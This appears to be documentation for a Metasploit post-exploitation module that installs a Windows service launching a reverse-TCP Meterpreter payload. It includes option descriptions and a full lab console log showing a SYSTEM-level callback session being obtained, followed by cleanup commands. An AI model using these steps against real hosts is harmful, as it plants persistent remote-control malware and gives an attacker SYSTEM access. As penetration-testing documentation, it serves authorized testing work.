## Overview
This Module will generate and upload an executable to a remote host and make it persistent service.
It will create a new service which will start the payload whenever the service is running. Privilege is required.

## Module Options
LHOST  IP of host that will receive the connection from the payload.
LPORT  Port for Payload to connect to.
OPTIONS Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
PAYLOAD The payload to use in the service.
SESSION The session to run this module on.

RetryTime The retry time that shell connect failed. 5 seconds as default.
RemoteExePath  The remote victim exe path to run. Use temp directory as default.
RemoteExeName  The remote victim name. Random string as default.
ServiceName    The name of service. Random string as default.'
ServiceDescription The description of service. Random string as default.


## Verification steps
* get session on target
* `use post/windows/manage/persistence_service`
* `set payload <payload>`
* `set lport <lport>`
* `set lhost <lhost>`
* `set handler true`
* `run`

## Usage
```
msf5 post(windows/manage/persistence_service) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: test-PC\test
meterpreter > sysinfo
Computer        : TEST-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf5 post(windows/manage/persistence_service) > options

Module options (post/windows/manage/persistence_service):

   Name     Current Setting                  Required  Description
   ----     ---------------                  --------  -----------
   HANDLER  true                             no        Start an exploit/multi/handler to receive the connection
   LHOST    192.168.56.1                     yes       IP of host that will receive the connection from the payload.
   LPORT    4433                             no        Port for Payload to connect to.
   OPTIONS                                   no        Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
   PAYLOAD  windows/meterpreter/reverse_tcp  no        The payload to use in the service.
   SESSION  1                                yes       The session to run this module on.
msf5 post(windows/manage/persistence_service) > run

[*] Running module against TEST-PC
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.56.1:4433
[+] Meterpreter service exe written to C:\Users\test\AppData\Local\Temp\IDJkb.exe
[*] Creating service pWbPkeDm
[*] Cleanup Meterpreter RC File: /Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc
[*] Post module execution completed
[*] Sending stage (179779 bytes) to 192.168.56.101
msf5 post(windows/manage/persistence_service) > [*] Meterpreter session 3 opened (192.168.56.1:4433 -> 192.168.56.101:50101) at 2018-10-17 18:37:51 +0800
msf5 post(windows/manage/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  test-PC\test @ TEST-PC         192.168.56.1:8888 -> 192.168.56.101:50098 (192.168.56.101)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ TEST-PC  192.168.56.1:4433 -> 192.168.56.101:50101 (192.168.56.101)

msf5 post(windows/manage/persistence_service) >
```
**Clean it**
```
msf5 post(windows/manage/persistence_service) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > resource /Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc
[*] Processing /Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc for ERB directives.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc)> execute -H -f sc.exe -a "stop pWbPkeDm"
Process 9652 created.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc)> execute -H -f sc.exe -a "delete pWbPkeDm"
Process 9816 created.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc)> execute -H -i -f taskkill.exe -a "/f /im IDJkb.exe"
Process 9688 created.
Channel 13 created.
SUCCESS: The process "IDJkb.exe" with PID 8956 has been terminated.
SUCCESS: The process "IDJkb.exe" with PID 8280 has been terminated.
SUCCESS: The process "IDJkb.exe" with PID 4332 has been terminated.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181017.3740/TEST-PC_20181017.3740.rc)> rm C:\\Users\\test\\AppData\\Local\\Temp\\IDJkb.exe
```


